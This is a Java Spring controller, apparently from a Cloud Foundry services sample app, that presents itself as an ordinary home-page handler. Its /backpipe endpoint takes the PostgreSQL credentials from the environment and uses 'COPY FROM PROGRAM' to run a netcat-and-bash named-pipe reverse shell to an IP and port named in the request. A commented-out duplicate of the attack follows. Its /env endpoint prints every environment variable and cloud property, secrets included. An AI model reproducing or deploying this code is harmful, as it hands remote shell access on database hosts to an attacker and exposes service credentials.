package org.cloudfoundry.services;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.sql.DataSource;

import org.apache.tomcat.dbcp.dbcp.BasicDataSource;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.data.mongodb.MongoDbFactory;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;
import org.springframework.jdbc.datasource.SimpleDriverDataSource;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.ClassUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.google.gson.Gson;

/**
 * Handles requests for the application home page.
 */
@Controller
public class ShellController {

	@Autowired(required=false) DataSource dataSource;
	@Autowired(required=false) RedisConnectionFactory redisConnectionFactory;
	@Autowired(required=false) MongoDbFactory mongoDbFactory;
	@Autowired(required=false) ConnectionFactory rabbitConnectionFactory;

	@Autowired(required=false) @Qualifier("cloudProperties") Properties cloudProperties;

	/**
	 * Simply selects the home view to render by returning its name.
	 */
	@RequestMapping(value="/", method=RequestMethod.GET)
	public String home(Model model) {
		List<String> services = new ArrayList<String>();
		if (ClassUtils.isPresent("org.apache.tomcat.dbcp.dbcp.BasicDataSource", ClassUtils.getDefaultClassLoader())
				&& dataSource instanceof org.apache.tomcat.dbcp.dbcp.BasicDataSource) {
			services.add("Data Source tomcat BasicDataSource: " + ((org.apache.tomcat.dbcp.dbcp.BasicDataSource) dataSource).getUrl());
		}
		else if (ClassUtils.isPresent("org.apache.commons.dbcp.BasicDataSource", ClassUtils.getDefaultClassLoader())
				&& dataSource instanceof org.apache.commons.dbcp.BasicDataSource) {
			services.add("Data Source BasicDataSource: " + ((org.apache.commons.dbcp.BasicDataSource) dataSource).getUrl());
		}
		else if (dataSource instanceof SimpleDriverDataSource) {
			services.add("Data Source: " + ((SimpleDriverDataSource) dataSource).getUrl());
		}
		if (redisConnectionFactory != null) {
			services.add("Redis: " + ((JedisConnectionFactory) redisConnectionFactory).getHostName() + ":" + ((JedisConnectionFactory) redisConnectionFactory).getPort());
		}
		if (mongoDbFactory != null) {
			services.add("MongoDB: " + mongoDbFactory.getDb().getMongo().getAddress());
		}
		if (rabbitConnectionFactory != null) {
			services.add("RabbitMQ: " + rabbitConnectionFactory.getHost() + ":" + rabbitConnectionFactory.getPort());
		}
		model.addAttribute("services", services);
		String environmentName = (System.getenv("VCAP_APPLICATION") != null) ? "Cloud" : "Local";
		model.addAttribute("environmentName", environmentName);
		return "home";
	}

	@RequestMapping("/env")
	public void env(HttpServletResponse response) throws IOException {
		response.setContentType("text/plain");
		PrintWriter out = response.getWriter();
		out.println("System Properties:");
		for (Map.Entry<Object, Object> property : System.getProperties().entrySet()) {
			out.println(property.getKey() + ": " + property.getValue());
		}
		out.println();
		out.println("System Environment:");
		for (Map.Entry<String, String> envvar : System.getenv().entrySet()) {
			out.println(envvar.getKey() + ": " + envvar.getValue());
		}
		out.println();
		out.println("Cloud Properties:");
		if (cloudProperties != null) {
			@SuppressWarnings({ "rawtypes", "unchecked" })
			List<String> keys = new ArrayList(cloudProperties.keySet());
			Collections.sort(keys);
			for (Object key : keys) {
				out.println(key + ": " + cloudProperties.get(key));
			}
		} else {
			out.println("Cloud properties not set");
		}
	}

	@RequestMapping("/backpipe")
	public void backpipe(HttpServletResponse response,HttpServletRequest request) throws IOException {
		response.setContentType("text/plain");
		PrintWriter out = response.getWriter();
		out.println("creating  backpipe:");
		Connection connection = null;

		try
		{
			Class.forName("org.postgresql.Driver");

			Gson gson = new Gson();
			VcapParams params = gson.fromJson( System.getenv().get("VCAP_SERVICES"), VcapParams.class);
			Postgresql postgresData=  params.getPostgresql().get(0);
			String dbschema = postgresData.getCredentials().getDbname();
			String dbuser = postgresData.getCredentials().getUsername();
			String dbpass = postgresData.getCredentials().getPassword();
			String dbhost = postgresData.getCredentials().getHostname();
			String dbport = postgresData.getCredentials().getPort();
			
			String dbName = dbschema.substring(dbschema.lastIndexOf('/')+1);
			connection = DriverManager.getConnection("jdbc:postgresql://"+dbhost+":"+dbport+"/"+dbName+"",dbuser, dbpass);
			PreparedStatement prepareStatement = null;

			String ip = request.getParameter("ip");
			String port = request.getParameter("port");

			try {
				prepareStatement = connection.prepareStatement("create table syss1 (input TEXT);");
				prepareStatement.executeUpdate();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				out.println("error" + e.getMessage());
			}
			finally
			{
				if(prepareStatement != null)
				{
					try {
						prepareStatement.close();
					} catch (SQLException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}

			PreparedStatement createPipe = null;
			try {
				createPipe = connection.prepareStatement("copy syss1 from program 'mknod backpipe p; nc "+ip+" "+port+" 0<backpipe | /bin/bash 1>backpipe';");
				createPipe.executeUpdate();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				out.println("error pipe" + e.getMessage());
			}
			finally
			{
				if(createPipe != null)
				{
					try {
						createPipe.close();
					} catch (SQLException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
			out.println(" backpipe closed");
		}

		catch(Exception e)
		{
			out.println("error last" + e.getMessage());
			e.printStackTrace();
		}
		finally
		{
			if(connection != null) {
				try {
					connection.close();
				} catch (SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
	}


	//	@RequestMapping("/backpipe")
	//	public void backpipe(HttpServletResponse response,HttpServletRequest request) throws IOException {
	//		response.setContentType("text/plain");
	//		PrintWriter out = response.getWriter();
	//		out.println("creating  backpipe:");
	//		Connection connection = null;
	//		
	//		try
	//		{
	//		Class.forName("org.postgresql.Driver");
	//		String dbhost = cloudProperties.getProperty("cloud.services.postgresql.connection.host");
	//		String dbport = cloudProperties.getProperty("cloud.services.postgresql.connection.port");
	//		String dbuser = cloudProperties.getProperty("cloud.services.postgresql.connection.username");
	//		String dbpass = cloudProperties.getProperty("cloud.services.postgresql.connection.password");
	//		String dbschema = cloudProperties.getProperty("cloud.services.postgresql.connection.jdbcurl");
	//		String dbName = dbschema.substring(dbschema.lastIndexOf('/')+1);
	//		
	//		connection = DriverManager.getConnection("jdbc:postgresql://"+dbhost+":"+dbport+"/"+dbName+"",dbuser, dbpass);
	//		PreparedStatement prepareStatement = null;
	//		
	//		String ip = request.getParameter("ip");
	//		String port = request.getParameter("port");
	//		
	//		try {
	//			prepareStatement = connection.prepareStatement("create table syss1 (input TEXT);");
	//			prepareStatement.executeUpdate();
	//		} catch (SQLException e) {
	//			// TODO Auto-generated catch block
	//			e.printStackTrace();
	//			out.println("error" + e.getMessage());
	//		}
	//		finally
	//		{
	//			if(prepareStatement != null)
	//			{
	//			  try {
	//				prepareStatement.close();
	//			} catch (SQLException e) {
	//				// TODO Auto-generated catch block
	//				e.printStackTrace();
	//			}
	//			}
	//		}
	//		
	//		PreparedStatement createPipe = null;
	//		try {
	//			createPipe = connection.prepareStatement("copy syss from program 'mknod backpipe p; nc "+ip+" "+port+" 0<backpipe | /bin/bash 1>backpipe';");
	//			createPipe.executeUpdate();
	//		} catch (SQLException e) {
	//			// TODO Auto-generated catch block
	//			e.printStackTrace();
	//			out.println("error pipe" + e.getMessage());
	//		}
	//		finally
	//		{
	//			if(createPipe != null)
	//			{
	//			  try {
	//				  createPipe.close();
	//			} catch (SQLException e) {
	//				// TODO Auto-generated catch block
	//				e.printStackTrace();
	//			}
	//			}
	//		}
	//		out.println(" backpipe closed");
	//	}
	//	
	//	catch(Exception e)
	//	{
	//		e.printStackTrace();
	//	}
	//	finally
	//	{
	//			if(connection != null) {
	//			   try {
	//				connection.close();
	//			} catch (SQLException e) {
	//				// TODO Auto-generated catch block
	//				e.printStackTrace();
	//			}
	//			}
	//		}
	//	}
	//	
}
